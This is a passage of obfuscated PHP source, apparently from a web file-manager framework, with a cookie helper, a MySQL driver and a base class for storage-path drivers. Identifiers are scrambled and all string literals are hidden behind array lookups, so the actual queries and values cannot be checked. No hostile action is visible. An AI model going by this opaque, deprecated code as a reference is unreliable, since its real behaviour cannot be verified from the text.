str_replace(HOST, $ÓãÒ¢ß“[12], APP_HOST); $™ß°»ĞÂ = _get($GLOBALS, $ÓãÒ¢ß“[889], $™ß°»ĞÂ); } $§ì™Ìé˜ = $ÓãÒ¢ß“[12]; setcookie($ˆ¼½ÍÅ‘, $²å‘ ë, time() + $µ­ÂÁÅ, $ÓãÒ¢ß“[8] . trim($™ß°»ĞÂ, $ÓãÒ¢ß“[8]) . $§ì™Ìé˜, !1, !1, $šøçµ²²); } public static function setSafe($åé©…¯å, $¿õÁÑâ, $ş°ö— = 0) { self::set($åé©…¯å, $¿õÁÑâ, $ş°ö—, !0); } public static function get($…ÌÇòÇë) { static $¨¹‚ˆí = false; if (!$¨¹‚ˆí) { self::initHeaderCookie(); $¨¹‚ˆí = !0; } return isset($_COOKIE[$…ÌÇòÇë]) ? $_COOKIE[$…ÌÇòÇë] : !1; } private static function initHeaderCookie() { $¯ƒÍñ™ =& $_SERVER[å¸¿•¶£]; if (!isset($_SERVER[$¯ƒÍñ™[890]]) || !$_SERVER[$¯ƒÍñ™[890]]) { return; } $Óëâªàö = explode($¯ƒÍñ™[71], $_SERVER[$¯ƒÍñ™[890]]); foreach ($Óëâªàö as $Ù¥‰¢÷) { $Ù¥‰¢÷ = explode($¯ƒÍñ™[891], $Ù¥‰¢÷); if (count($Ù¥‰¢÷) != 2 || !isset($Ù¥‰¢÷[1])) { continue; } $_COOKIE[trim($Ù¥‰¢÷[0])] = trim($Ù¥‰¢÷[1]); } } public static function remove($—Áê“Èç, $º…À¼†¶ = false) { unset($_COOKIE[$—Áê“Èç]); self::set($—Áê“Èç, $_SERVER[å¸¿•¶£][12], 1, $º…À¼†¶); } } class DbMysql extends Db { public function __construct($õõƒÙ«² = '') { $Íñôö‡ =& $_SERVER[å¸¿•¶£]; if (!extension_loaded($Íñôö‡[811])) { think_exception(think_lang($Íñôö‡[14]) . $Íñôö‡[892]); } if (!empty($õõƒÙ«²)) { $this->config = $õõƒÙ«²; if (empty($this->config[$Íñôö‡[17]])) { $this->config[$Íñôö‡[17]] = $Íñôö‡[12]; } } } public function connect($ó·ÁÍ‚è = '', $Âíî˜ Š = 0, $àùàª = false) { $ƒïü¥˜ç =& $_SERVER[å¸¿•¶£]; if (!isset($this->linkID[$Âíî˜ Š])) { if (empty($ó·ÁÍ‚è)) { $ó·ÁÍ‚è = $this->config; } $€¹Æ‡èÍ = $ó·ÁÍ‚è[$ƒïü¥˜ç[893]] . ($ó·ÁÍ‚è[$ƒïü¥˜ç[894]] ? "\72{$ó·ÁÍ‚è[$ƒïü¥˜ç[894]]}" : $ƒïü¥˜ç[12]); $­¯´ø‘¿ = !empty($ó·ÁÍ‚è[$ƒïü¥˜ç[17]][$ƒïü¥˜ç[18]]) ? $ó·ÁÍ‚è[$ƒïü¥˜ç[17]][$ƒïü¥˜ç[18]] : $this->pconnect; if ($­¯´ø‘¿) { $this->linkID[$Âíî˜ Š] = mysql_pconnect($€¹Æ‡èÍ, $ó·ÁÍ‚è[$ƒïü¥˜ç[895]], $ó·ÁÍ‚è[$ƒïü¥˜ç[896]], 131072); } else { $this->linkID[$Âíî˜ Š] = mysql_connect($€¹Æ‡èÍ, $ó·ÁÍ‚è[$ƒïü¥˜ç[895]], $ó·ÁÍ‚è[$ƒïü¥˜ç[896]], !0, 131072); } if (!$this->linkID[$Âíî˜ Š] || !empty($ó·ÁÍ‚è[$ƒïü¥˜ç[21]]) && !mysql_select_db($ó·ÁÍ‚è[$ƒïü¥˜ç[21]], $this->linkID[$Âíî˜ Š])) { think_exception(mysql_error()); } $Êïâß•¨ = mysql_get_server_info($this->linkID[$Âíî˜ Š]); mysql_query($ƒïü¥˜ç[897] . think_config($ƒïü¥˜ç[898]) . $ƒïü¥˜ç[58], $this->linkID[$Âíî˜ Š]); if ($Êïâß•¨ > $ƒïü¥˜ç[899]) { mysql_query($ƒïü¥˜ç[900], $this->linkID[$Âíî˜ Š]); } $this->connected = !0; if (1 != think_config($ƒïü¥˜ç[22])) { unset($this->config); } } return $this->linkID[$Âíî˜ Š]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($«õŸÊÍâ) { $òÍ†öò¥ =& $_SERVER[å¸¿•¶£]; if (0 === stripos($«õŸÊÍâ, $òÍ†öò¥[264])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $«õŸÊÍâ; if ($this->queryID) { $this->free(); } think_action_status($òÍ†öò¥[23], 1); think_status($òÍ†öò¥[24]); $this->queryID = mysql_query($«õŸÊÍâ, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($—ÅÕÕÂ) { $£¾„ÙÄü =& $_SERVER[å¸¿•¶£]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $—ÅÕÕÂ; if ($this->queryID) { $this->free(); } think_action_status($£¾„ÙÄü[25], 1); think_status($£¾„ÙÄü[24]); $Û½Ø‘ºñ = mysql_query($—ÅÕÕÂ, $this->_linkID); $this->debug(); if (!1 === $Û½Ø‘ºñ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[å¸¿•¶£][901], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $Âˆù´ê = mysql_query($_SERVER[å¸¿•¶£][902], $this->_linkID); $this->transTimes = 0; if (!$Âˆù´ê) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Æ™ŞêÇÕ = mysql_query($_SERVER[å¸¿•¶£][903], $this->_linkID); $this->transTimes = 0; if (!$Æ™ŞêÇÕ) { $this->error(); return !1; } } return !0; } private function getAll() { $×¥©Ô€ = array(); if ($this->numRows > 0) { while ($’ÊÌ›¨Ü = mysql_fetch_assoc($this->queryID)) { $×¥©Ô€[] = $’ÊÌ›¨Ü; } mysql_data_seek($this->queryID, 0); } return $×¥©Ô€; } public function getFields($Ş‘‡‚Éï) { $˜›ëÃÜª =& $_SERVER[å¸¿•¶£]; $ÀáÖ‘öõ = $this->query($˜›ëÃÜª[904] . $this->parseKey($Ş‘‡‚Éï)); $†¼¾›§Ò = array(); if ($ÀáÖ‘öõ) { foreach ($ÀáÖ‘öõ as $¸°‹¾í¦ => $•ãóÈ¸Û) { $†¼¾›§Ò[$•ãóÈ¸Û[$˜›ëÃÜª[31]]] = array($˜›ëÃÜª[32] => $•ãóÈ¸Û[$˜›ëÃÜª[31]], $˜›ëÃÜª[33] => $•ãóÈ¸Û[$˜›ëÃÜª[34]], $˜›ëÃÜª[35] => (bool) (strtoupper($•ãóÈ¸Û[$˜›ëÃÜª[36]]) === $˜›ëÃÜª[905]), $˜›ëÃÜª[37] => $•ãóÈ¸Û[$˜›ëÃÜª[38]], $˜›ëÃÜª[39] => strtolower($•ãóÈ¸Û[$˜›ëÃÜª[40]]) == $˜›ëÃÜª[41], $˜›ëÃÜª[42] => strtolower($•ãóÈ¸Û[$˜›ëÃÜª[43]]) == $˜›ëÃÜª[44]); } } return $†¼¾›§Ò; } public function getTables($ÔÜ´šÖ˜ = '') { $ïÜ¬ÅçÇ =& $_SERVER[å¸¿•¶£]; if (!empty($ÔÜ´šÖ˜)) { $™°­ÅÚà = $ïÜ¬ÅçÇ[906] . $ÔÜ´šÖ˜ . $ïÜ¬ÅçÇ[907]; } else { $™°­ÅÚà = $ïÜ¬ÅçÇ[908]; } $ä›«Èäû = $this->query($™°­ÅÚà); $ËÕºìïŞ = array(); foreach ($ä›«Èäû as $©­¨ÚÏÆ => $æäÍğé‰) { $ËÕºìïŞ[$©­¨ÚÏÆ] = current($æäÍğé‰); } return $ËÕºìïŞ; } public function replace($«”’ÑÚ¾, $®ÊÖÇÛÅ = array()) { $ğ¯ì¾ƒŸ =& $_SERVER[å¸¿•¶£]; foreach ($«”’ÑÚ¾ as $Î¶Óğ§¸ => $¦ŸŞÁô ) { $ûêµûØò = $this->parseValue($¦ŸŞÁô ); if (is_scalar($ûêµûØò)) { $¢–¬—Ú™[] = $ûêµûØò; $¶¥”½¥è[] = $this->parseKey($Î¶Óğ§¸); } } $«Í“™² = $ğ¯ì¾ƒŸ[909] . $this->parseTable($®ÊÖÇÛÅ[$ğ¯ì¾ƒŸ[279]]) . $ğ¯ì¾ƒŸ[910] . implode($ğ¯ì¾ƒŸ[50], $¶¥”½¥è) . $ğ¯ì¾ƒŸ[911] . implode($ğ¯ì¾ƒŸ[50], $¢–¬—Ú™) . $ğ¯ì¾ƒŸ[912]; return $this->execute($«Í“™²); } public function insertAll($Ã„í”—æ, $šƒËÛè = array(), $ûß¡ığà = false) { $àòİÙÆ =& $_SERVER[å¸¿•¶£]; if (!is_array($Ã„í”—æ[0])) { return !1; } $ÈëÛ¯ = array_keys($Ã„í”—æ[0]); $¡‚äèí™ = array(); foreach ($Ã„í”—æ as $ŒŒÆ­¨) { $ïËÓëãó = array(); foreach ($ŒŒÆ­¨ as $À±¤¨€ => $ş¯–ù»°) { $ş¯–ù»° = $this->parseValue($ş¯–ù»°); if (is_scalar($ş¯–ù»°)) { $ïËÓëãó[] = $ş¯–ù»°; } } $¡‚äèí™[] = $àòİÙÆ[260] . implode($àòİÙÆ[50], $ïËÓëãó) . $àòİÙÆ[912]; } array_walk($ÈëÛ¯, array($this, $àòİÙÆ[913])); $ÔÎÅîñ = ($ûß¡ığà ? $àòİÙÆ[914] : $àòİÙÆ[915]) . $àòİÙÆ[916] . $this->parseTable($šƒËÛè[$àòİÙÆ[279]]) . $àòİÙÆ[910] . implode($àòİÙÆ[50], $ÈëÛ¯) . $àòİÙÆ[917] . implode($àòİÙÆ[50], $¡‚äèí™); return $this->execute($ÔÎÅîñ); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $şãÖ¬°ã =& $_SERVER[å¸¿•¶£]; $this->error = mysql_errno() . $şãÖ¬°ã[4] . mysql_error($this->_linkID); if ($şãÖ¬°ã[12] != $this->queryStr) { $this->error .= LNG($şãÖ¬°ã[48]) . $this->queryStr; } think_trace($this->error, $şãÖ¬°ã[12], $şãÖ¬°ã[49]); return $this->error; } public function escapeString($İê—á±) { if ($this->_linkID) { return mysql_real_escape_string($İê—á±, $this->_linkID); } else { return mysql_escape_string($İê—á±); } } public function parseKey(&$éı·ôË•, $×¢œ€Ù = true) { $–óíºú¢ =& $_SERVER[å¸¿•¶£]; if ($×¢œ€Ù) { $éı·ôË• = $this->parseKeyCheck($éı·ôË•); } if ($éı·ôË• != $–óíºú¢[189] && !preg_match($–óíºú¢[918], $éı·ôË•)) { $éı·ôË• = $–óíºú¢[385] . trim($éı·ôË•, $–óíºú¢[385]) . $–óíºú¢[385]; } return $éı·ôË•; } } goto C†Û§¢’Ÿ£; böª•àÄ°: class PathDriverBase { public $pathDriver = ''; public $pathBase = ''; public $path = ''; public $pathID = ''; public $_data = array(); public function __construct() { $’»·¯ùí =& $_SERVER[å¸¿•¶£]; $this->objectDriver = array($’»·¯ùí[60], $’»·¯ùí[61], $’»·¯ùí[62], $’»·¯ùí[63], $’»·¯ùí[64], $’»·¯ùí[65], $’»·¯ùí[66], $’»·¯ùí[67], $’»·¯ùí[68]); $this->_classObjectID = mt_rand(0, 10000); } public function getPath($ñı‹ûÑ) { if (in_array($this->getType(), $this->objectDriver)) { return ltrim($ñı‹ûÑ, $_SERVER[å¸¿•¶£][8]); } return $ñı‹ûÑ; } public function iconvApp($½ø¸Ä¹) { return $½ø¸Ä¹; } public function iconvSystem($¨ÎºÌÈÍ) { return $¨ÎºÌÈÍ; } public function iconvTo($ı’Â¨Û, $çˆ£ÈœÂ, $Ö¾î»Á¿) { $­å†óÉ† =& $_SERVER[å¸¿•¶£]; if (!$ı’Â¨Û || !function_exists($­å†óÉ†[69])) { return $ı’Â¨Û; } static $‰ŒÇƒªù = array(); $î¨Ü¡éà = $çˆ£ÈœÂ . $­å†óÉ†[70] . $Ö¾î»Á¿ . $­å†óÉ†[71] . $ı’Â¨Û; if (isset($‰ŒÇƒªù[$î¨Ü¡éà])) { return $‰ŒÇƒªù[$î¨Ü¡éà]; } if (function_exists($­å†óÉ†[72])) { $ææğ¹°« = @mb_convert_encoding($ı’Â¨Û, $Ö¾î»Á¿, $çˆ£ÈœÂ); } else { $ææğ¹°« = @iconv($çˆ£ÈœÂ, $Ö¾î»Á¿, $ı’Â¨Û); } $ææğ¹°« = $ææğ¹°« ? $ææğ¹°« : $ı’Â¨Û; if (strstr($ææğ¹°«, $­å†óÉ†[73])) { $ææğ¹°« = str_replace($­å†óÉ†[73], $­å†óÉ†[11], $ææğ¹°«); } $‰ŒÇƒªù[$çˆ£ÈœÂ . $­å†óÉ†[70] . $Ö¾î»Á¿ . $­å†óÉ†[71] . $ı’Â¨Û] = $ææğ¹°«; $‰ŒÇƒªù[$Ö¾î»Á¿ . $­å†óÉ†[70] . $çˆ£ÈœÂ . $­å†óÉ†[71] . $ı’Â¨Û] = $ı’Â¨Û; $‰ŒÇƒªù[$Ö¾î»Á¿ . $­å†óÉ†[70] . $çˆ£ÈœÂ . $­å†óÉ†[71] . $ææğ¹°«] = $ı’Â¨Û; $‰ŒÇƒªù[$çˆ£ÈœÂ . $­å†óÉ†[70] . $Ö¾î»Á¿ . $­å†óÉ†[71] . $ææğ¹°«] = $ææğ¹°«; return $ææğ¹°«; } public function getPathInner($‰Ò¬ôò) { $é½›ñÃ× = IO::init($‰Ò¬ôò); return $é½›ñÃ×->path; } public function getPathOuter($¤İôÚÕœ) { $˜—½½µ† =& $_SERVER[å¸¿•¶£]; $ƒŠõÊéÚ = strlen(trim($this->pathBase, $˜—½½µ†[8])); $¤İôÚÕœ = substr(trim($¤İôÚÕœ, $˜—½½µ†[8]), $ƒŠõÊéÚ); return $this->pathDriver . $˜—½½µ†[8] . ltrim($¤İôÚÕœ, $˜—½½µ†[8]); } public function isParentOf($Ï±‚ ªÄ, $àŸç¡İ÷) { $×…¤»ô¨ =& $_SERVER[å¸¿•¶£]; $Ï±‚ ªÄ = rtrim(strtolower($Ï±‚ ªÄ), $×…¤»ô¨[8]) . $×…¤»ô¨[8]; $àŸç¡İ÷ = rtrim(strtolower($àŸç¡İ÷), $×…¤»ô¨[8]) . $×…¤»ô¨[8]; $ÌÆ•ñè‡ = strpos($àŸç¡İ÷, $Ï±‚ ªÄ) === 0; return $ÌÆ•ñè‡; } public function getType() { $®çİ• =& $_SERVER[å¸¿•¶£]; $Ú’ŞÃ—× = str_replace($®çİ•[74], $®çİ•[12], get_class($this)); return strtolower($Ú’ŞÃ—×); } public function isTypeObject() { if (!is_array($this->objectDriver)) { return !1; } return in_array($this->getType(), $this->objectDriver); } public function fileNameExist($”—ÉĞÛ˜, $¸î¾€òğ) { $ã°õı‡ =& $_SERVER[å¸¿•¶£]; $Ê¿ÜÂ¶¶ = rtrim($”—ÉĞÛ˜, $ã°õı‡[8]) . $ã°õı‡[8] . $¸î¾€òğ; $Õ»ÓÉ²Ù = $this->exist($Ê¿ÜÂ¶¶); return $Õ»ÓÉ²Ù ? $Ê¿ÜÂ¶¶ : !1; } public function setModifyTime($óíÅÈÈĞ, $• àµ = '') { } public function renameObject($ÃÖÈ° , $˜±½åŸØ) { $Æ¤„®¥Ï = $˜±½åŸØ; $ÃÖÈ°  = $this->getPathOuter($ÃÖÈ° ); $˜±½åŸØ = $this->pathFather($ÃÖÈ° ) . $˜±½åŸØ; $úÙÂ‡È™ = IO::copy($ÃÖÈ° , $this->pathFather($ÃÖÈ° ), REPEAT_RENAME_FOLDER, $Æ¤„®¥Ï); if ($úÙÂ‡È™) { IO::remove($ÃÖÈ° ); } return $úÙÂ‡È™ ? $˜±½åŸØ : !1; } public function tempFile($¦Šñöú  = '', $âØ÷òí¸ = '') { if (!$¦Šñöú ) { $¦Šñöú  = rand_string(15); } $í¼æôáõ = TEMP_FILES . rand_string(15) . $_SERVER[å¸¿•¶£][8]; @mkdir($í¼æôáõ, DEFAULT_PERRMISSIONS, !0); $Å…æÜ£ê = $í¼æôáõ . $¦Šñöú ; @touch($Å…æÜ£ê); if ($âØ÷òí¸) { file_put_contents($Å…æÜ£ê, $âØ÷òí¸); } return $Å…æÜ£ê; } public function tempFileRemve($ƒê¬Ÿ») { @unlink($ƒê¬Ÿ»); @rmdir($this->pathFather($ƒê¬Ÿ»)); } public function mkfile($Ìß·Åš, $ÍÆ¾ê‰Û = '', $¾ –²ö = REPEAT_RENAME) { } public function mkdir($×É°Ş³¦, $¬‹¯Ó» = REPEAT_SKIP) { } public function delFile($ê®‰Ø«) { } public function delFolder($¹»¼¨¢§) { } public function copyFile($ãúÉä‹Ñ, $Îªöà) { } public function moveFile($ªÂù·ÃÙ, $¸úûøÒ„) { } public function remove($ ¹¾ô’å) { if ($this->isFile($ ¹¾ô’å)) { return $this->delFile($ ¹¾ô’å); } return $this->delFolder($ ¹¾ô’å); } public function rename($ÃÏ£˜Ö‹, $¬Ø–ñ÷†) { } public function exist($ñØÄŒ…Æ) { } public function findByHash($™£Œ‹¾Î = '', $¶³Êõç´ = '') { return !1; } public function isFile($·«Ó®ğ•) { } public function isFolder($Úáõâ²) { } public function size($›Â­á®í) { } public function info($ªÛçÕ¯´) { } public function infoSimple($“ö½ñ¯¥) { return $this->info($“ö½ñ¯¥); } public function infoAuth($·—ìÇû) { return $this->info($·—ìÇû); } public function infoFull($ÂÆØëË¢) { return $this->info($ÂÆØëË¢); } public function infoWithChildren($”“Êê‹Å) { $À¥şß¼× =& $_SERVER[å¸¿•¶£]; static $ïÀçÒ†— = array(); if (isset($ïÀçÒ†—[$”“Êê‹Å])) { return $ïÀçÒ†—[$”“Êê‹Å]; } $ñ…õÑÊÏ = $this->info($”“Êê‹Å); if ($ñ…õÑÊÏ && $ñ…õÑÊÏ[$À¥şß¼×[33]] == $À¥şß¼×[75]) { $ÇÕÈşòÂ = array($À¥şß¼×[76] => 0, $À¥şß¼×[77] => 0, $À¥şß¼×[78] => 0); $this->infoChildren($”“Êê‹Å, $ÇÕÈşòÂ); $ñ…õÑÊÏ[$À¥şß¼×[76]] = $ÇÕÈşòÂ[$À¥şß¼×[76]]; $ñ…õÑÊÏ[$À¥şß¼×[79]] = array($À¥şß¼×[80] => $ÇÕÈşòÂ[$À¥şß¼×[77]], $À¥şß¼×[81] => $ÇÕÈşòÂ[$À¥şß¼×[78]]); $ïÀçÒ†—[$”“Êê‹Å] = $ñ…õÑÊÏ; } return $ñ…õÑÊÏ; } public function listPath($¨„ÉÖğœ, $Ï—åÌÒÉ = false) { } public function has($†¯Öíš”, $§èï¡ = false, $ò‚¬‚ï = false) { } public function canRead($ÃÓ•¨¯§) { } public function canWrite($äºš¸ÅÏ) { } public function getContent($ïİ´µúŸ) { } public function setContent($ùØåï¿ó, $—¤ï†»ı = '') { } protected function infoChildren($«Œ‘¢ÚÔ, &$íØğÕµ) { $Ú†ûí…å =& $_SERVER[å¸¿•¶£]; check_abort_echo(); $õöã¨¦à = $this->listPath($«Œ‘¢ÚÔ, !0); $õöã¨¦à = array_merge($õöã¨¦à[$Ú†ûí…å[82]], $õöã¨¦à[$Ú†ûí…å[83]]); foreach ($õöã¨¦à as $Û´¥²½×) { if ($Û´¥²½×[$Ú†ûí…å[33]] == $Ú†ûí…å[75]) { $íØğÕµ[$Ú†ûí…å[78]]++; $¹ÍÚÄ×‹ = $this->getPathInner($Û´¥²½×[$Ú†ûí…å[84]]); $this->infoChildren($¹ÍÚÄ×‹, $íØğÕµ); } else { $íØğÕµ[$Ú†ûí…å[77]]++; $íØğÕµ[$Ú†ûí…å[76]] += $Û´¥²½×[$Ú†ûí…å[76]]; } } } public function fileSubstr($ ëÖËì«, $Öñ“šå, $ğ˜òŠ) { } public function listAll($Ç ìá›´) { } public function listAllMake($÷şıû›·, &$¬åÁ¯•Œ) { $±ÆÍµâ« =& $_SERVER[å¸¿•¶£]; check_abort_echo(); $ š£–òî = $this->listPath($÷şıû›·, !0); if (!$ š£–òî) { return; } $ÎæŒ€Ò = array_merge($ š£–òî[$±ÆÍµâ«[82]], $ š£–òî[$±ÆÍµâ«[83]]); foreach ($ÎæŒ€Ò as $Ğ¤Ÿáåç) { $ëĞÎÛÆá = $Ğ¤Ÿáåç[$±ÆÍµâ«[33]] == $±ÆÍµâ«[75]; $¸Úıíú» = array($±ÆÍµâ«[84] => $Ğ¤Ÿáåç[$±ÆÍµâ«[84]], $±ÆÍµâ«[75] => $ëĞÎÛÆá); if (isset($Ğ¤Ÿáåç[$±ÆÍµâ«[76]])) { $¸Úıíú»[$±ÆÍµâ«[76]] = $Ğ¤Ÿáåç[$±ÆÍµâ«[76]]; } if (isset($Ğ¤Ÿáåç[$±ÆÍµâ«[85]])) { $¸Úıíú»[$±ÆÍµâ«[85]] = $Ğ¤Ÿáåç[$±ÆÍµâ«[85]]; } if (!$ëĞÎÛÆá) { $¬åÁ¯•Œ[] = $¸Úıíú»; continue; } $¬åÁ¯•Œ[] = $¸Úıíú»; $ßŞŞ÷ÊÏ = $Ğ¤Ÿáåç[$±ÆÍµâ«[84]]; $ÆşÇŒãí = $this->pathDriver; if (substr($Ğ¤Ÿáåç[$±ÆÍµâ«[84]], 0, strlen($ÆşÇŒãí)) == $ÆşÇŒãí) { $ßŞŞ÷ÊÏ = substr($ßŞŞ÷ÊÏ, strlen($ÆşÇŒãí)); } $this->listAllMake($ßŞŞ÷ÊÏ, $¬åÁ¯•Œ); } } public function listAllSimple($ƒª¢‘Öº, $Ä÷ÎÅô¹ = false) { $ôÏú‡ÛÎ = $this->listAll($ƒª¢‘Öº); return $this->listAllSimpleMake($ôÏú‡ÛÎ, $this->getPathOuter($ƒª¢‘Öº), $Ä÷ÎÅô¹); } public function listAllSimpleMake($Òú¶ğ™Ø, $û«úÙ¢¥, $¾–’†‡) { $ßŠÖ†æä =& $_SERVER[å¸¿•¶£]; $ŠŒÑ­ = array(); $û«úÙ¢¥ = rtrim(get_path_father($û«úÙ¢¥), $ßŠÖ†æä[8]) . $ßŠÖ†æä[8]; foreach ($Òú¶ğ™Ø as $î„´åÕ) { $„ø¡ùÆì = array($ßŠÖ†æä[84] => $î„´åÕ[$ßŠÖ†æä[84]], $ßŠÖ†æä[86] => $î„´åÕ[$ßŠÖ†æä[84]], $ßŠÖ†æä[75] => $î„´åÕ[$ßŠÖ†æä[75]]); if (isset($î„´åÕ[$ßŠÖ†æä[76]]) && !$î„´åÕ[$ßŠÖ†æä[75]]) { $„ø¡ùÆì[$ßŠÖ†æä[76]] = $î„´åÕ[$ßŠÖ†æä[76]]; } if (isset($î„´åÕ[$ßŠÖ†æä[85]])) { $„ø¡ùÆì[$ßŠÖ†æä[85]] = $î„´åÕ[$ßŠÖ†æä[85]]; } if (is_array($î„´åÕ[$ßŠÖ†æä[87]])) { $„ø¡ùÆì[$ßŠÖ†æä[86]] = $î„´åÕ[$ßŠÖ†æä[87]][$ßŠÖ†æä[84]]; $„ø¡ùÆì[$ßŠÖ†æä[76]] = $î„´åÕ[$ßŠÖ†æä[87]][$ßŠÖ†æä[76]]; $„ø¡ùÆì[$ßŠÖ†æä[85]] = $î„´åÕ[$ßŠÖ†æä[87]][$ßŠÖ†æä[85]]; } else { if (substr($î„´åÕ[$ßŠÖ†æä[84]], 0, strlen($û«úÙ¢¥)) == $û«úÙ¢¥) { $„ø¡ùÆì[$ßŠÖ†æä[84]] = substr($î„´åÕ[$ßŠÖ†æä[84]], strlen($û«úÙ¢¥)); } } $¾ Şê›Ô = $î„´åÕ[$ßŠÖ†æä[75]] ? $ßŠÖ†æä[8] : $ßŠÖ†æä[12]; $„ø¡ùÆì[$ßŠÖ†æä[86]] = rtrim($„ø¡ùÆì[$ßŠÖ†æä[86]], $ßŠÖ†æä[8]) . $¾ Şê›Ô; $„ø¡ùÆì[$ßŠÖ†æä[84]] = $ßŠÖ†æä[8] . trim($„ø¡ùÆì[$ßŠÖ†æä[84]], $ßŠÖ†æä[8]) . $¾ Şê›Ô; if (!$¾–’†‡) { $Â¦´¨Ò¬ = explode($ßŠÖ†æä[8], trim($„ø¡ùÆì[$ßŠÖ†æä[84]], $ßŠÖ†æä[8])); $„ø¡ùÆì[$ßŠÖ†æä[84]] = $ßŠÖ†æä[8] . implode($ßŠÖ†æä[8], array_slice($Â¦´¨Ò¬, 1)) . $¾ Şê›Ô; } $ŠŒÑ­[] = $„ø¡ùÆì; } return array_sort_by($ŠŒÑ­, $ßŠÖ†æä[84]); } public function upload($–Àè±, $Ñ÷ƒùş, $Ø˜©¾šâ = false, $®Ø†´ƒ‚ = REPEAT_REPLACE) { } public function uploadFileByID($ö—ÊàËş, $¤Ëµçù©, $½œ½¸ê‚) { } public function uploadFileByPath($°¸ËÖü, $ÚÛ¸ÍÖ¡, $õß¢¨ö¶ = array()) { } public function isUploadServer() { $°ï»‹š =& $_SERVER[å¸¿•¶£]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $°ï»‹š[88]) { return !0; } return $GLOBALS[$°ï»‹š[6]][$°ï»‹š[89]][$°ï»‹š[90]]; } public function isFileOutServer() { $óğÊ›ãò =& $_SERVER[å¸¿•¶£]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $óğÊ›ãò[88]) { return !0; } return $GLOBALS[$óğÊ›ãò[6]][$óğÊ›ãò[89]][$óğÊ›ãò[91]]; } public function isCdnHost() { return $this->isFileOutServer() || empty($this->cdnHost) ? !1 : !0; } public function getCdnLink($­×•É°) { $à»ÊÑ¾™ =& $_SERVER[å¸¿•¶£]; if (!$this->isCdnHost()) { return $­×•É°; } return str_replace(trim(get_url_root($­×•É°), $à»ÊÑ¾™[8]), trim($this->cdnHost, $à»ÊÑ¾™[8]), $­×•É°); } public function uploadLink($‘Óî±Õ, $©¨ú×„ò = 0) { $ÂÚ†¾è =& $_SERVER[å¸¿•¶£]; if ($this->isUploadServer()) { return; } $ù–èÁ¦Ÿ = $this->getType(); if (!in_array($ù–èÁ¦Ÿ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $©Ë¨Çú = 1024 * 1024 * 10; $ª’¶ÌÄò = $©¨ú×„ò <= $©Ë¨Çú ? $ÂÚ†¾è[92] : $ÂÚ†¾è[93]; $´»Î¬Ê¶ = (!$©¨ú×„ò ? 1 : ceil($©¨ú×„ò / pow(1024, 3))) * 3600 * 4; $ãØÁäìº = $this->{$ª’¶ÌÄò}($‘Óî±Õ, $´»Î¬Ê¶); if ($ãØÁäìº) { $ãØÁäìº[$ÂÚ†¾è[94]] = $‘Óî±Õ; $ãØÁäìº[$ÂÚ†¾è[95]] = $ù–èÁ¦Ÿ; } return $ãØÁäìº; } public function uploadFormData($µ±ş…øú, $¯™šæ–½ = 3600) { } public function multiUploadFormData($ñ×©§¥Ú, $ûßŸÜÉ‚ = 3600) { } public function download($Å‰‡Ÿöª, $°®‚ãĞÉ) { } public function ext($øœâ‹Æ×) { $’Ä’şœ´ =& $_SERVER[å¸¿•¶£]; if (strpos($øœâ‹Æ×, $’Ä’şœ´[8]) === -1) { $èÓ€å‹Ô = $øœâ‹Æ×; } else { $èÓ€å‹Ô = $this->pathThis($øœâ‹Æ×); } $Öí»½˜ = $’Ä’şœ´[12]; if (strstr($èÓ€å‹Ô, $’Ä’şœ´[10])) { $Öí»½˜ = substr($èÓ€å‹Ô, strrpos($èÓ€å‹Ô, $’Ä’şœ´[10]) + 1); $Öí»½˜ = strtolower($Öí»½˜); } if (strlen($Öí»½˜) > 3 && preg_match($’Ä’şœ´[96], $Öí»½˜, $ñ¼µ¼âÜ)) { $Öí»½˜ = $’Ä’şœ´[12]; } return $Öí»½˜; } public function pathThis($œŠŞ££Á) { $åšÆ‘ãİ =& $_SERVER[å¸¿•¶£]; $œŠŞ££Á = str_replace($åšÆ‘ãİ[97], $åšÆ‘ãİ[8], rtrim($œŠŞ££Á, $åšÆ‘ãİ[8])); $âÀ›ÎâÏ = strrpos($œŠŞ££Á, $åšÆ‘ãİ[8]); if ($âÀ›ÎâÏ === !1) { return $œŠŞ££Á; } return substr($œŠŞ££Á, $âÀ›ÎâÏ + 1); } public function pathFather($˜ö”ê—Ğ) { $ÈÅ™ëâõ =& $_SERVER[å¸¿•¶£]; $˜ö”ê—Ğ = str_replace($ÈÅ™ëâõ[97], $ÈÅ™ëâõ[8], rtrim($˜ö”ê—Ğ, $ÈÅ™ëâõ[8])); $Ì±ëÒÄ = strrpos($˜ö”ê—Ğ, $ÈÅ™ëâõ[8]); if ($Ì±ëÒÄ === !1) { return $ÈÅ™ëâõ[12]; } return substr($˜ö”ê—Ğ, 0, $Ì±ëÒÄ + 1); } public function hashSimple($ä¶ü¡¸Ó) { $‡ÀÅ¬É„ =& $_SERVER[å¸¿•¶£]; if (!$ä¶ü¡¸Ó) { return md5($‡ÀÅ¬É„[12]); } $¥í…±“Ñ = $this->size($ä¶ü¡¸Ó); $Ğ±Ã–éè = 200; $Ğ¬â÷µ÷ = 50; if ($¥í…±“Ñ <= $Ğ±Ã–éè * $Ğ¬â÷µ÷) { return $this->hashMd5($ä¶ü¡¸Ó) . $¥í…±“Ñ; } $Åâ¾Ğ©á = intval($¥í…±“Ñ / $Ğ¬â÷µ÷); $¼˜¿ˆÊå = $‡ÀÅ¬É„[12]; for ($ÄÍĞû²À = 0; $ÄÍĞû²À < $Ğ¬â÷µ÷; $ÄÍĞû²À++) { $¼˜¿ˆÊå .= $this->fileSubstr($ä¶ü¡¸Ó, $Åâ¾Ğ©á * $ÄÍĞû²À, 